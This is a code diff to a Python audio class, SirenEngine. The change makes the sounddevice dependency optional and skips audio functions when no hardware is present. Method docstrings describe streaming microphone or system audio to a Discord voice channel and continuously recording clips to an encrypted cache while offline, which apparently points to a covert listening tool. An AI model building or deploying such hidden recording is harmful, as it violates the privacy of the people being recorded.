@@ -1,6 +1,9 @@
 import os
 import asyncio
-import sounddevice as sd
+try:
+    import sounddevice as sd
+except Exception as e:
+    sd = None
 import numpy as np
 import io
 import wave
@@ -18,14 +21,17 @@ class SirenEngine:
         self.sample_rate = 48000
         self.channels = 2
         self.buffer_size = 1024
+        self.available = sd is not None
 
     def get_input_devices(self):
         """List all available audio input devices."""
+        if not self.available:
+             return "Audio hardware/drivers not available."
         return sd.query_devices()
 
     async def stream_to_voice(self, voice_client):
         """Capture system/mic audio and stream it directly to a Discord voice channel."""
-        if not voice_client:
+        if not voice_client or not self.available:
             return
 
         self.is_streaming = True
@@ -46,7 +52,7 @@ class SirenEngine:
 
     async def start_offline_ears(self, duration_per_clip=60):
         """Continuously record audio in chunks and save to encrypted cache when offline."""
-        if self.is_recording_offline:
+        if self.is_recording_offline or not self.available:
             return
             
         self.is_recording_offline = True
@@ -95,4 +101,6 @@ class SirenEngine:
 
     def stop_offline_ears(self):
         self.is_recording_offline = False
-        sd.stop()
+        if self.available:
+            sd.stop()
+
